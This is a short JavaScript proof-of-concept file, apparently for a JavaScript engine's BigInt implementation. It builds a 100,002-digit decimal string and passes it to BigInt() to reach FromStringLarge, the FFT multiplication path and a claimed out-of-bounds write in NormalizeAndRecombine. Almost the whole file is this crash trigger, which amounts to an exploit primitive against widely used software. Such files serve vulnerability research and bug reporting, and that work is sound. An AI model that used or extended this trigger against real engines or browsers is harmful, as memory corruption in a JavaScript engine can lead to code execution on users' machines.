// PoC for BigInt NormalizeAndRecombine OOB Write via FromStringLarge
// ============================================================
// This PoC triggers the OOB via BigInt(string) which goes through
// FromStringLarge -> Multiply -> MultiplyFFT -> NormalizeAndRecombine.
//
// Same instrumentation requirements as poc_bigint_division_oob.js

// Create a very large decimal string that triggers FromStringLarge
// (requires num_parts >= kFromStringLargeThreshold = 25)
let s = "1";
for (let i = 0; i < 100000; i++) {
  s += "0";
}
s += "1"; // Make it non-trivial

// BigInt(string) -> FromStringLarge -> Multiply -> FFT
const a = BigInt(s);

print("FromString completed (if you see this, the OOB wasn't caught)");
